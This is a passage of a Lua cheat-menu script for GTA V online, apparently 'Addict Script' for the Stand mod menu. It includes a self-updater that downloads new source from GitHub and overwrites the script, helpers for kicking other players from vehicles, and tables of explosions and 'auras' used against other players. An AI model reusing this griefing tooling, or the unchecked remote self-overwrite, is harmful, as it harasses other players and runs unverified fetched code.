--[[
WE HAVE TAKEN OVER░ \☻/\☻/
░░░░░░░░░░░░░░░░░░░▌░ ▌
░░░░░░░░░░░░░░░░░░ / \░ / \
░░░░░░░░░░░░░░░░░███████ ]▄▄▄▄▄▄▄▄▄-----------●
░░░░░░░░░░░░▂▄▅█████████▅▄▃▂
░░░░░░░░░░░I███████████████████].
]]
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
util.keep_running()
util.require_natives("natives-1663599433-uno")
util.require_natives("natives-1640181023")
util.require_natives("natives-1651208000")
util.require_natives("natives-1663599433")
guidedMissile = require "ToxTool"

local github = menu.list(menu.my_root(), "Github", {"addictgithub"})

async_http.init("raw.githubusercontent.com","/Addict0919/Addict-Script/main/AddictScript/AddictScriptChangelog.txt",function(b)
    response=true;
    menu.action(github, "Changelog", {"addictchangelog"}, b, function()
        async_http.dispatch()
    end)
end,
function()
    response=true 
end)
async_http.dispatch()
repeat util.yield()
until response 

local local_menu_version = 7.1

if not dev_mode then
    async_http.init("raw.githubusercontent.com","/Addict0919/Addict-Script/main/AddictScript/AddictScriptVersion.lua",function(b)
        currentVer=tonumber(b)
        response=true;
        if local_menu_version~=currentVer then 
            menu.action(github,"Update",{"updateAddict"},"If it still says Update when it was updated you might have to redownload the libs",function()
                util.toast("New Version found")async_http.init('raw.githubusercontent.com','/Addict0919/Addict-Script/main/AddictScript/Addict Script.lua',function(c)
                    local d=select(2,load(c))
                    if d then
                        return 
                    end;
                    local e=io.open(filesystem.scripts_dir()..SCRIPT_RELPATH,"wb")
                    e:write(c)
                    e:close()
                    util.restart_script()
                end)
                async_http.dispatch()
            end)
        end 
    end,
    function()
        response=true 
    end)
    async_http.dispatch()
    repeat util.yield()
    until response 
end

util.toast("Welcome To Addict Script! v" .. local_menu_version .. "\n" .. "\n" .. "Check Github tab for updates...\n" .. "\n" .. "Enjoy Playing :)")

util.log("░█████╗░██████╗░██████╗░██╗░█████╗░████████╗  ░██████╗░█████╗░██████╗░██╗██████╗░████████╗")
util.log("██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝  ██╔════╝██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝")
util.log("███████║██║░░██║██║░░██║██║██║░░╚═╝░░░██║░░░  ╚█████╗░██║░░╚═╝██████╔╝██║██████╔╝░░░██║░░░")
util.log("██╔══██║██║░░██║██║░░██║██║██║░░██╗░░░██║░░░  ░╚═══██╗██║░░██╗██╔══██╗██║██╔═══╝░░░░██║░░░")
util.log("██║░░██║██████╔╝██████╔╝██║╚█████╔╝░░░██║░░░  ██████╔╝╚█████╔╝██║░░██║██║██║░░░░░░░░██║░░░")
util.log("╚═╝░░╚═╝╚═════╝░╚═════╝░╚═╝░╚════╝░░░░╚═╝░░░  ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░░░░░░░╚═╝░░░")
util.log("▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒")
util.log("▒▒████▄▒▒▒▄▄▄▄▄▄▄▒▒▒▄████▒▒")
util.log("▒▒▒▒▒▀▀▒▄█████████▄▒▀▀▒▒▒▒▒")
util.log("▒▒▒▒▒▒▒█████████████▒▒▒▒▒▒▒")
util.log("▒▒▒▒▒▒▒██▀▀▀███▀▀▀██▒▒▒▒▒▒▒")
util.log("▒▒▒▒▒▒▒██▒▒▒███▒▒▒██▒▒▒▒▒▒▒")
util.log("▒▒▒▒▒▒▒█████▀▄▀█████▒▒▒▒▒▒▒")
util.log("▒▒▒▒▒▒▒▒▒▒███████▒▒▒▒▒▒▒▒▒▒")
util.log("▒▒▒▒▄▄▄██▒▒█▀█▀█▒▒██▄▄▄▒▒▒▒")
util.log("▒▒▒▒▀▀██▒▒▒▒▒▒▒▒▒▒▒██▀▀▒▒▒▒")
util.log("▒▒▒▒▒▒▀▀▒▒▒▒▒▒▒▒▒▒▒▀▀▒▒▒▒▒▒")
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
local Credits = menu.list(menu.my_root(), "Credits", {"addictcredits"}, "<3")
---------------------------------------------------------------------------------
menu.divider(Credits, "Great Coders <3")
---------------------------------------------------------------------------------
menu.action(Credits, "Unseemly", {}, "Great coder wouldn't even have an auto updater or certain mods fixed if it wasn't for this guy <3.", function() end)
menu.action(Credits, "Not_DerPaul", {}, "Great coder helped with security and testing :).", function() end)
menu.action(Credits, "Cystal", {}, "Very smart coder helped with mods I gave up on.", function() end)
menu.action(Credits, "Legy", {}, "Very smart guy great lua coder with cool suggestions.", function() end)
menu.action(Credits, "0xDEADBEEF", {}, "Helped with tons of suggestions, testing and sharing his own code:)", function() end)
menu.action(Credits, "Chaos", {}, "Great guy supported me with everything to keep the script running otherwise I would of gave up coding publicly.", function() end)
menu.action(Credits, "Wigger", {}, "Codes very well!, very smart guy always has an answer for me :).", function() end)
menu.action(Credits, "Glitter", {}, "Known for a long time since I first played gta <3.", function() end)
menu.action(Credits, "Nosa", {}, "Known for long time very smart guy. Helped me with code and suggestions.", function() end)
menu.action(Credits, "Clone69420", {}, "Github Collaborator", function() end)
---------------------------------------------------------------------------------
menu.divider(Credits, "Great Supporters <3")
---------------------------------------------------------------------------------
menu.action(Credits, "Yumin", {}, "Yumin Auuuughhh, this guy is my best friend.", function() end)
menu.action(Credits, "Kwengz", {}, "This guy got me into paid menus and showed me the ropes.", function() end)
menu.action(Credits, "Rawbert", {}, "Top guy! Known long time he loves drifting in peacful sessions.", function() end)
menu.action(Credits, "Stark", {}, "Provided lots great suggestions :D.", function() end)
menu.action(Credits, "Everyοnе", {}, "He knows who he is lol.", function() end)
menu.action(Credits, "Masi", {}, "Known long time :)", function() end)
menu.action(Credits, "Jonash", {}, "Provided great suggestions along the way :).", function() end)
menu.action(Credits, "Uncle", {}, "Nice guy always there to help <3.", function() end)
menu.action(Credits, "Presidente", {}, "Fun guy to play with known a long time :).", function() end)
menu.action(Credits, "Mr-Stoner", {}, "Funny guy to play with, ofc hes a fucking stoner <3.", function() end)
menu.action(Credits, "Dealer", {}, "Very cool down to eath guy.", function() end)
menu.action(Credits, "Library", {}, "Always been there to help :).", function() end)
menu.action(Credits, "FBI4", {}, "Great support always helped us :).", function() end)
menu.action(Credits, "Sophie", {}, "For some great ideas she likes to put forward.", function() end)
menu.action(Credits, "Charlie", {}, "", function() end)
menu.action(Credits, "If I missed anyone dm me please <3", {}, "Sorry if I forgot you but if you know me ask for love.", function() end)

local translations = {}
setmetatable(translations, {
    __index = function (self, key)
        return key
    end
})

local festive_div = menu.divider(menu.my_root(), "Addict Script")
local loading_frames = {'!', '! !', '! ! !', '! ! ! !', ' ! ! ! ! ! ! ! ! !', '! ! ! !', '! ! !', '! !', '!'}
util.create_tick_handler(function()
    for _, frame in pairs(loading_frames) do
        menu.set_menu_name(festive_div, frame .. ' ' .. translations.Addict_Script .. ' ' .. frame)
        util.yield(100)
    end
end)

local aalib = require("aalib")
local PlaySound = aalib.play_sound
local SND_ASYNC<const> = 0x0001
local SND_FILENAME<const> = 0x00020000

resources_dir = filesystem.resources_dir() .. '\\Addictscript\\'
Addictscript_logo = directx.create_texture(resources_dir .. 'Addictscript_logo.png')

if not filesystem.is_dir(resources_dir) then
    --notification("If Addict Script is not installed properly. Some things will fail to load or break.")
end

if not SCRIPT_SILENT_START then
    logo_alpha = 0
    logo_alpha_incr = 0.02
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then 
                logo_alpha = 0	
            end
        util.yield()
    end
end)

    logo_thread = util.create_thread(function (thr)
        starttime = os.clock()
        local alpha = 0
        while true do
            directx.draw_texture(Addictscript_logo, 0.15, 0.10, 0.5, 0.7, 0.5, 0.5, 0, 1, 1, 1, logo_alpha)
            timepassed = os.clock() - starttime
            if timepassed > 1 then
                logo_alpha_incr = -0.01
            end
            if logo_alpha == 0 then
            end
            util.yield()
        end
    end)
    PlaySound(resources_dir .. "\\bruh.wav", SND_FILENAME | SND_ASYNC)
end

--------------------------------------------------------------------------------------
local alarm = false

function random_float(min, max)
	return min + math.random() * (max - min)
end

function start_alarm(alarm_time)
    alarm = false
    local time = 0

    util.create_tick_handler(function()
        local time_elapsed = MISC.GET_FRAME_TIME() * 1000

        if time >= alarm_time then
            alarm = true
            return false
        else
            time += time_elapsed
        end
    end)
end

function get_alarm()
    return alarm
end

function get_hud_colour()
    local red_command_ref <const> = menu.ref_by_path("Stand>Settings>Appearance>Colours>HUD Colour>Red")
    local green_command_ref <const> = menu.ref_by_path("Stand>Settings>Appearance>Colours>HUD Colour>Green")
    local blue_command_ref <const> = menu.ref_by_path("Stand>Settings>Appearance>Colours>HUD Colour>Blue")
    local alpha_command_ref <const> = menu.ref_by_path("Stand>Settings>Appearance>Colours>HUD Colour>Opacity")
    local red <const> = menu.get_value(red_command_ref)
    local green <const> = menu.get_value(green_command_ref)
    local blue <const> = menu.get_value(blue_command_ref)
    local alpha <const> = menu.get_value(alpha_command_ref)

    return red, green, blue, alpha
end

function request_model(model)
    STREAMING.REQUEST_MODEL(model)

    while not STREAMING.HAS_MODEL_LOADED(model) do
        util.yield()
    end
end

function request_ptfx_asset(asset)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)

    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        util.yield()
    end
end

function wait_session_transition(yield_time)
    yield_time = yield_time or 1000

    while util.is_session_transition_active() do
        util.yield(yield_time)
    end
end

function wait_player_revive(player_id, yield_time)
    yield_time = yield_time or 250

    while PLAYER.IS_PLAYER_DEAD(player_id) do
        util.yield(yield_time)
    end
end

function kick_player_out_of_veh(player_id, yield_time, max_time)
    yield_time = yield_time or 50
    max_time = max_time or 1000

    local player_ped <const> = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    local player_root_ref <const> = menu.player_root(player_id)
    local kick_vehicle_command_ref <const> = menu.ref_by_rel_path(player_root_ref, "Trolling>Kick From Vehicle")

    menu.trigger_command(kick_vehicle_command_ref)
    start_alarm(max_time)

    while PED.IS_PED_IN_ANY_VEHICLE(player_ped) do
        local is_alarm_finished <const> = get_alarm()

        if is_alarm_finished then
            break
        end

        util.yield(yield_time)
    end
end

function get_random_pos_on_radius(pos, radius)
    local angle <const> = random_float(0, 2 * math.pi)
    pos = v3.new(pos.x + math.cos(angle) * radius, pos.y + math.sin(angle) * radius, pos.z)

    return pos
end

function get_vehicles_in_range(pos, range, exclude_personal_vehicles)
    pos = pos or v3.new(0, 0, 0)
    range = range or 16000
    exclude_personal_vehicles = exclude_personal_vehicles or false

    local all_vehicles <const> = entities.get_all_vehicles_as_pointers()
    local vehicles = {}

    for i, vehicle in pairs(all_vehicles) do
        local vehicle_pos <const> = entities.get_position(vehicle)
        local is_vehicle_in_range <const> = v3.distance(pos, vehicle_pos) <= range
        local is_vehicle_personal <const> = entities.get_vehicle_has_been_owned_by_player(vehicle)

        if is_vehicle_in_range and not (exclude_personal_vehicles and is_vehicle_personal) then
            table.insert(vehicles, vehicle)
        end
    end
    return vehicles
end

function get_peds_in_range(pos, range, exclude_players)
    pos = pos or v3.new(0, 0, 0)
    range = range or 16000
    exclude_players = exclude_players or false

    local all_peds <const> = entities.get_all_peds_as_pointers()
    local peds = {}

    for i, ped in pairs(all_peds) do
        local ped_pos <const> = entities.get_position(ped)
        local is_ped_in_range <const> = v3.distance(pos, ped_pos) <= range
        local is_ped_a_player <const> = entities.get_player_info(ped) ~= 0

        if is_ped_in_range and not (exclude_players and is_ped_a_player) then
            table.insert(peds, ped)
        end
    end
    return peds
end

function get_objects_in_range(pos, range)
    pos = pos or v3.new(0, 0, 0)
    range = range or 16000

    local all_objects <const> = entities.get_all_objects_as_pointers()
    local objects = {}

    for i, object in pairs(all_objects) do
        local object_pos <const> = entities.get_position(object)
        local is_object_in_range <const> = v3.distance(pos, object_pos) <= range

        if is_object_in_range then
            table.insert(objects, object)
        end
    end
    return objects
end


function get_pickups_in_range(pos, range)
    pos = pos or v3.new(0, 0, 0)
    range = range or 16000

    local all_pickups <const> = entities.get_all_pickups_as_pointers()
    local pickups = {}

    for i, pickup in pairs(all_pickups) do
        local pickup_pos <const> = entities.get_position(pickup)
        local is_pickup_in_range <const> = v3.distance(pos, pickup_pos) <= range

        if is_pickup_in_range then
            table.insert(pickups, pickup)
        end
    end
    return pickups
end

--------------------------------------------------------------------------------------

--########################################################

  ---------------------| Variables |---------------------

--########################################################

local explosion_types <const> = {
    [0] = {"Grenade"},
    [1] = {"Grenade Launcher"},
    [2] = {"Stickybomb"},
    [3] = {"Molotov"},
    [4] = {"Rocket"},
    [5] = {"Tankshell"},
    [6] = {"Hi Octane"},
    [7] = {"Car"},
    [8] = {"Plane"},
    [9] = {"Petrol Pump"},
    [10] = {"Bike"},
    [11] = {"Steam"},
    [12] = {"Flame"},
    [13] = {"Water Hydrant"},
    [14] = {"Gas Canister"},
    [15] = {"Boat"},
    [16] = {"Ship"},
    [17] = {"Truck"},
    [18] = {"Bullet"},
    [19] = {"Smoke Grenade Launcher"},
    [20] = {"Smoke Grenade"},
    [21] = {"BZ Gas"},
    [22] = {"Flare"},
    [23] = {"Gas Canister"},
    [24] = {"Extinguisher"},
    [25] = {"Programmable AR"},
    [26] = {"Train"},
    [27] = {"Barrel"},
    [28] = {"Propane"},
    [29] = {"Blimp"},
    [30] = {"Flame Explode"},
    [31] = {"Tanker"},
    [32] = {"Plane Rocket"},
    [33] = {"Vehicle Bullet"},
    [34] = {"Gas Tank"},
    [36] = {"Railgun"},
    [37] = {"Blimp 2"},
    [38] = {"Firework"},
    [39] = {"Snowball"},
    [40] = {"Proximity Mine"},
    [41] = {"Valkyrie Cannon"},
    [42] = {"Air Defence"},
    [43] = {"Pipe Bomb"},
    [44] = {"Vehicle Mine"},
    [45] = {"Explosive Ammo"},
    [46] = {"APC Shell"},
    [47] = {"Cluster Bomb"},
    [48] = {"Gas Bomb"},
    [49] = {"Incendiary Bomb"},
    [50] = {"Standard Bomb"},
    [51] = {"Torpedo"},
    [52] = {"Underwater Torpedo"},
    [53] = {"Bombushka Cannon"},
    [54] = {"Cluster Bomb 2"},
    [55] = {"Hunter Barrage"},
    [56] = {"Hunter Cannon"},
    [57] = {"Rogue Cannon"},
    [58] = {"Underwater Mine"},
    [59] = {"Orbital Cannon"},
    [60] = {"Bomb Standard Wide"},
    [61] = {"Explosive Shotgun Ammo"},
    [62] = {"Oppressor MKII Cannon"},
    [63] = {"Mortar Kinetic"},
    [64] = {"Kinetic Mine"},
    [65] = {"EMP Mine"},
    [66] = {"Spike Mine"},
    [67] = {"Slick Mine"},
    [68] = {"Tar Mine"},
    [69] = {"Drone"},
    [70] = {"Up-n-Atomizer"},
    [71] = {"Buried Mine"},
    [72] = {"Missile"},
    [73] = {"RC Tank Rocket"},
    [74] = {"Water Bomb"},
    [75] = {"Water Bomb 2"},
    [78] = {"Flash Grenade"},
    [79] = {"Stun Grenade"},
    [81] = {"Large Missile"},
    [82] = {"Big Submarine"},
    [83] = {"EMP Launcher"}
}

local entity_types <const> = {
    [0] = {"Cone", name = "prop_mp_cone_01"},
    [1] = {"Pole", name = "prop_roadpole_01b"},
    [2] = {"Barrier", name = "prop_barrier_work06a"},
    [4] = {"Water Barrier", name = "prop_barrier_wat_03b"},
    [5] = {"Log", name = "prop_log_01"},
    [8] = {"Pipe", name = "prop_pipes_conc_01"},
    [9] = {"Pizza", name = "prop_pizza_box_02"},
    [10] = {"Burger", name = "prop_cs_burger_01"},
    [11] = {"Fries", name = "prop_food_chips"},
    [12] = {"Coke", name = "ng_proc_sodacan_01a"},
    [13] = {"Beer", name = "prop_amb_beer_bottle"},
    [14] = {"Glass", name = "prop_cs_shot_glass"},
    [15] = {"Coffee", name = "p_amb_cofeecup_01"},
    [16] = {"Panties", name = "p_cs_panties_03_s"},
    [17] = {"Dildo", name = "prop_cs_dildo_01"},
    [18] = {"Teddy Bear", name = "prop_mr_rasberryclean"},
    [19] = {"Fridge", name = "prop_fridge_01"},
    [20] = {"Washer", name = "prop_washer_02"},
    [21] = {"Television", name = "prop_tv_04"},
    [22] = {"Laptop", name = "bkr_prop_clubhouse_laptop_01a"},
    [23] = {"Tablet", name = "hei_prop_dlc_tablet"},
    [24] = {"Phone", name = "prop_phone_ing"},
    [25] = {"Money", name = "bkr_prop_money_wrapped_01"},
    [26] = {"Gold Bar", name = "ch_prop_gold_bar_01a"},
    [27] = {"Security Case", name = "prop_security_case_01"},
    [28] = {"Bomb", name = "w_smug_bomb_01"},
    [29] = {"Dummy", name = "prop_dummy_01"},
    [30] = {"Coffin", name = "prop_coffin_02b"},
    [31] = {"Death Body", name = "prop_water_corpse_02"},
    [32] = {"Umbrella", name = "p_amb_brolly_01_s"},
    [33] = {"Guitar", name = "prop_acc_guitar_01"},
    [34] = {"Ferris Wheel", name = "prop_ld_ferris_wheel"},
    [35] = {"Asteroid", name = "prop_asteroid_01"},
    [36] = {"Trash Bag", name = "p_binbag_01_s"},
    [37] = {"Bin", name = "prop_bin_08a"},
    [38] = {"Wheelchair", name = "prop_wheelchair_01"},
    [39] = {"Alien Egg", name = "prop_alien_egg_01"},
    [40] = {"Beachball", name = "prop_beachball_01"},
    [41] = {"Golfball", name = "prop_golf_ball"},
    [42] = {"Big Soccerball", name = "stt_prop_stunt_soccer_ball"}
}


local vehicle_types <const> = {
    [0] = {"Faggio", name = "faggio"},
    [1] = {"Go Kart", name = "veto"},
    [2] = {"Zhaba", name = "zhaba"},
    [3] = {"Buzzard", name = "buzzard2"},
    [4] = {"Insurgent", name = "insurgent"},
    [5] = {"Khanjali", name = "Khanjali"},
    [6] = {"Phantom Wedge", name = "phantom2"},
    [7] = {"Armored Boxville", name = "boxville5"},
    [8] = {"Bus", name = "bus"},
    [9] = {"Blimp", name = "blimp"},
}

local aura_vehicle_types <const> = {
    [0] = {"Explode"},
    [1] = {"Burn"},
    [2] = {"EMP"},
    [3] = {"Delete"}
}

local aura_ped_types <const> = {
    [0] = {"Explode"},
    [1] = {"Burn"},
    [2] = {"Taze"},
    [3] = {"Delete"}
}

local forcefield_types <const> = {
    [0] = {"Push"},
    [1] = {"Pull"}
}

local fake_pickup_types <const> = {
    [0] = {
        "Money Bag",
        objects = {
            "p_poly_bag_01_s"
        }
    },
    [1] = {
        "Action Figure",
        objects = {
            "vw_prop_vw_colle_alien",
            "vw_prop_vw_colle_beast",
            "vw_prop_vw_colle_imporage",
            "vw_prop_vw_colle_pogo",
            "vw_prop_vw_colle_prbubble",
            "vw_prop_vw_colle_rsrcomm",
            "vw_prop_vw_colle_rsrgeneric",
            "vw_prop_vw_colle_sasquatch"
        }
    },
    [2] = {
        "P's & Q's",
        objects = {
            "prop_choc_pq"
        }
    },
}

--########################################################

	funfun = menu.list(menu.my_root(), "Fun Shit", {}, "", function(); end)

    menu.divider(funfun, "Fun Shit")
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

menyoo_root = menu.list(funfun, "Menyoo", {"menyoo"}, "Menyoo support!")
menyoovmain_root = menu.list(menyoo_root, "Vehicles", {"menyoovehicles"}, "Menyoo vehicle support!")
menyoom1_root = menu.list(menyoo_root, "Maps", {"menyoomapsroot"}, "Menyoo maps support!")
menyoom_root = menu.list(menyoom1_root, "Maps", {"menyooallmaps"}, "All maps in your directory")
menyoomloaded_root = menu.list(menyoom1_root, "Currently loaded maps", {"menyooloadedmaps"}, "Maps you have loaded")
menyoov_root = menu.list(menyoovmain_root, "All vehicles", {"menyooloadedmaps"}, "Vehicles you have spawned")
menyoovloaded_root = menu.list(menyoovmain_root, "Currently loaded vehicles", {"menyooloadedmaps"}, "Vehicles you have spawned")

--           __  ___   ______   _   __   __  __   ____     ____              _  __    __  ___   __
--          /  |/  /  / ____/  / | / /  / / / /  / __ \   / __ \            | |/ /   /  |/  /  / /
--         / /|_/ /  / __/    /  |/ /  / / / /  / / / /  / / / /  ______    |   /   / /|_/ /  / /
--        / /  / /  / /___   / /|  /  / /_/ /  / /_/ /  / /_/ /  /_____/   /   |   / /  / /  / /___ 
--       /_/  /_/  /_____/  /_/ |_/   \____/   \____/   \____/            /_/|_|  /_/  /_/  /_____/  

function setup_menyoo_vehicles_list(mainroot, player, allplayers, dotp, dir)
    for i, path in ipairs(filesystem.list_files(vehicles_dir)) do
        root = mainroot
        local ours = false
        if player == players.user() then
            ours = true 
        end
        if filesystem.is_dir(path) then
            root = menu.list(root, path:gsub(vehicles_dir, ''), {}, "")
            for i,path in ipairs(filesystem.list_files(path)) do
                if not allplayers then
                    menu.action(root, path:gsub(vehicles_dir, ''), {}, "Spawn this menyoo vehicle", function(on_click)
                        log("Click type was " .. on_click)
                        menyoo_load_vehicle(path, player, dotp, ours)
                    end)
                else
                    menu.action(root, path:gsub(vehicles_dir, ''), {}, "Spawn this menyoo vehicle for all players", function(on_click)
                        for k,v in pairs(players.list(true, true, true)) do
                            log("Click type was " .. on_click)
                            menyoo_load_vehicle(path, v, dotp, false)
                        end
                    end)
                end
            end
        else
            if string.match(path:gsub(vehicles_dir, ''), '.xml') then
                if not allplayers then
                    menu.action(root, path:gsub(vehicles_dir, ''), {}, "Spawn this menyoo vehicle", function(on_click)
                        toast("Click type was " .. on_click)
                        menyoo_load_vehicle(path, player, dotp, ours)
                    end)
                else
                    menu.action(root, path:gsub(vehicles_dir, ''), {}, "Spawn this menyoo vehicle for all players", function(on_click)
                        for k,v in pairs(players.list(true, true, true)) do
                            toast("Click type was " .. on_click)
                            menyoo_load_vehicle(path, v, dotp, false)
                        end
                    end)
                end
            end
        end
    end
end

function setup_menyoo_maps_list()
   for i, path in ipairs(filesystem.list_files(maps_dir)) do
       if filesystem.is_dir(path) then
           root = menu.list(menyoom_root, path:gsub(maps_dir, ''), {}, "")
           for i,path in ipairs(filesystem.list_files(path)) do
               menu.action(root, path:gsub(maps_dir, ''), {}, "Spawn this menyoo map", function()
                   menyoo_load_map(path)
               end)
           end
       else
           if string.match(path:gsub(maps_dir, ''), '.xml') then
               menu.action(menyoom_root, path:gsub(maps_dir, ''), {}, "Spawn this menyoo map", function()
                   menyoo_load_map(path)
               end)
           end
       end
   end
end

setup_menyoo_vehicles_list(menyoov_root, players.user(), false, true)
setup_menyoo_maps_list()

Effect = {asset = "", name = ""}
Effect.__index = Effect

function Effect.new(asset, name)
   local inst = setmetatable({}, Effect) 
   inst.name = name
   inst.asset = asset
   return inst
end

    weapons = menu.list(funfun, "Weapon Shit", {}, "", function(); end)



local last_equipped_weapon = WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.GET_PLAYER_PED(players.user()))
local attachments_table = {
    ---------------------PISTOLS--------------------------------------
    ["0xFED0FD71"] = "Default Clip", --Default Clip
    ["0xED265A1C"] = "Extended Clip", --Extended Clip
    ["0x359B7AAE"] = "Flashlight", --Flashlight
    ["0x65EA7EBB"] = "Suppressor", --Suppressor
    ["0xD7391086"] = "Yusuf Amir Luxury Finish", --Yusuf Amir Luxury Finish
    ["0x721B079"] = "Default Clip", --Default Clip
    ["0xD67B4F2D"] = "Extended Clip", --Extended Clip
    ["0xC304849A"] = "Suppressor", --Suppressor
    ["0xC6654D72"] = "Yusuf Amir Luxury Finish", --Yusuf Amir Luxury Finish
    ["0x31C4B22A"] = "Default Clip", --Default Clip
    ["0x249A17D5"] = "Extended Clip", --Extended Clip
    ["0x9B76C72C"] = "Gilded Gun Metal Finish", --Gilded Gun Metal Finish
    ["0x2297BE19"] = "Default Clip", --Default Clip
    ["0xD9D3AC92"] = "Extended Clip", --Extended Clip
    ["0xA73D4664"] = "Suppressor", --Suppressor
    ["0x77B8AB2F"] = "Platinum Pearl Deluxe Finish", --Platinum Pearl Deluxe Finish
    ["0x16EE3040"] = "VIP Variant", --VIP Variant
    ["0x9493B80D"] = "Bodyguard Variant", --Bodyguard Variant
    ["0xE9867CE3"] = "Default Clip", --Default Clip
    ["0xF8802ED9"] = "Default Clip", --Default Clip
    ["0x7B0033B3"] = "Extended Clip", --Extended Clip
    ["0x8033ECAF"] = "Etched Wood Grip Finish", --Etched Wood Grip Finish
    ["0xD4A969A"] = "Default Clip", --Default Clip
    ["0x64F9C62B"] = "Extended Clip", --Extended Clip
    ["0x7A6A7B7B"] = "Etched Wood Grip Finish", --Etched Wood Grip Finish
    ["0xBA23D8BE"] = "Default Rounds", --Default Rounds
    ["0xC6D8E476"] = "Tracer Rounds", --Tracer Rounds
    ["0xEFBF25"] = "Incendiary Rounds", --Incendiary Rounds
    ["0x10F42E8F"] = "Hollow Point Rounds", --Hollow Point Rounds
    ["0xDC8BA3F"] = "Full Metal Jacket Rounds", --Full Metal Jacket Rounds
    ["0x420FD713"] = "Holographic Sight", --Holographic Sight
    ["0x49B2945"] = "Small Scope", --Small Scope
    ["0x27077CCB"] = "Compensator", --Compensator
    ["0xC03FED9F"] = "Digital Camo", --Digital Camo
    ["0xB5DE24"] = "Brushstroke Camo", --Brushstroke Camo
    ["0xA7FF1B8"] = "Woodland Camo", --Woodland Camo
    ["0xF2E24289"] = "Skull", --Skull
    ["0x11317F27"] = "Sessanta Nove", --Sessanta Nove
    ["0x17C30C42"] = "Perseus", --Perseus
    ["0x257927AE"] = "Leopard", --Leopard
    ["0x37304B1C"] = "Zebra", --Zebra
    ["0x48DAEE71"] = "Geometric", --Geometric
    ["0x20ED9B5B"] = "Boom!", --Boom!
    ["0xD951E867"] = "Patriotic", --Patriotic
    ["0x1466CE6"] = "Default Clip", --Default Clip
    ["0xCE8C0772"] = "Extended Clip", --Extended Clip
    ["0x902DA26E"] = "Tracer Rounds", --Tracer Rounds
    ["0xE6AD5F79"] = "Incendiary Rounds", --Incendiary Rounds
    ["0x8D107402"] = "Hollow Point Rounds", --Hollow Point Rounds
    ["0xC111EB26"] = "Full Metal Jacket Rounds", --Full Metal Jacket Rounds
    ["0x4A4965F3"] = "Flashlight", --Flashlight
    ["0x47DE9258"] = "Mounted Scope", --Mounted Scope
    ["0xAA8283BF"] = "Compensator", --Compensator
    ["0xF7BEEDD"] = "Digital Camo", --Digital Camo
    ["0x8A612EF6"] = "Brushstroke Camo", --Brushstroke Camo
    ["0x76FA8829"] = "Woodland Camo", --Woodland Camo
    ["0xA93C6CAC"] = "Skull", --Skull
    ["0x9C905354"] = "Sessanta Nove", --Sessanta Nove
    ["0x4DFA3621"] = "Perseus", --Perseus
    ["0x42E91FFF"] = "Leopard", --Leopard
    ["0x54A8437D"] = "Zebra", --Zebra
    ["0x68C2746"] = "Geometric", --Geometric
    ["0x2366E467"] = "Boom!", --Boom!
    ["0x441882E6"] = "Boom!", --Boom!
    ["0xE7EE68EA"] = "Digital Camo", --Digital Camo
    ["0x29366D21"] = "Brushstroke Camo", --Brushstroke Camo
    ["0x3ADE514B"] = "Woodland Camo", --Woodland Camo
    ["0xE64513E9"] = "Skull", --Skull
    ["0xCD7AEB9A"] = "Sessanta Nove", --Sessanta Nove
    ["0xFA7B27A6"] = "Perseus", --Perseus
    ["0xE285CA9A"] = "Leopard", --Leopard
    ["0x2B904B19"] = "Zebra", --Zebra
    ["0x22C24F9C"] = "Geometric", --Geometric
    ["0x8D0D5ECD"] = "Boom!", --Boom!
    ["0x1F07150A"] = "Patriotic", --Patriotic
    ["0x94F42D62"] = "Default Clip", --Default Clip
    ["0x5ED6C128"] = "Extended Clip", --Extended Clip
    ["0x25CAAEAF"] = "Tracer Rounds", --Tracer Rounds
    ["0x2BBD7A3A"] = "Incendiary Rounds", --Incendiary Rounds
    ["0x85FEA109"] = "Hollow Point Rounds", --Hollow Point Rounds
    ["0x4F37DF2A"] = "Full Metal Jacket Rounds", --Full Metal Jacket Rounds
    ["0x8ED4BB70"] = "Mounted Scope", --Mounted Scope
    ["0x43FD595B"] = "Flashlight", --Flashlight
    ["0x21E34793"] = "Compensator", --Compensator
    ["0x5C6C749C"] = "Digital Camo", --Digital Camo
    ["0x15F7A390"] = "Brushstroke Camo", --Brushstroke Camo
    ["0x968E24DB"] = "Woodland Camo", --Woodland Camo
    ["0x17BFA99"] = "Skull", --Skull
    ["0xF2685C72"] = "Sessanta Nove", --Sessanta Nove
    ["0xDD2231E6"] = "0xDD2231E6", --Perseus
    ["0xBB43EE76"] = "Leopard", --Leopard
    ["0x4D901310"] = "Zebra", --Zebra
    ["0x5F31B653"] = "Geometric", --Geometric
    ["0x697E19A0"] = "Boom!", --Boom!
    ["0x930CB951"] = "Patriotic", --Patriotic
    ["0xB4FC92B0"] = "Digital Camo", --Digital Camo
    ["0x1A1F1260"] = "Digital Camo", --Digital Camo
    ["0xE4E00B70"] = "Digital Camo",
    ["0x2C298B2B"] = "Digital Camo",
    ["0xDFB79725"] = "Digital Camo",
    ["0x6BD7228C"] = "Digital Camo",
    ["0x9DDBCF8C"] = "Digital Camo",
    ["0xB319A52C"] = "Digital Camo",
    ["0xC6836E12"] = "Digital Camo",
    ["0x43B1B173"] = "Digital Camo",
    ["0x4ABDA3FA"] = "Patriotic", --Patriotic
    ["0x45A3B6BB"] = "Default Clip", --Default Clip
    ["0x33BA12E8"] = "Extended Clip", --Extended Clip
    ["0xD7DBF707"] = "Festive tint", --Festive tint
    ["0x54D41361"] = "Default Clip", --Default Clip
    ["0x81786CA9"] = "Extended Clip", --Extended Clip
    ["0x9307D6FA"] = "Suppressor", --Suppressor
    ----------------SUBMACHINE-GUNS------------------------
    ["0xCB48AEF0"] = "Default Clip",
    ["0x10E6BA2B"] = "Extended Clip",
    ["0x359B7AAE"] = "Flashlight",
    ["0x9D2FBF29"] = "Scope",
    ["0x487AAE09"] = "Yusuf Amir Luxury Finish",
    ["0x26574997"] = "Default Clip",
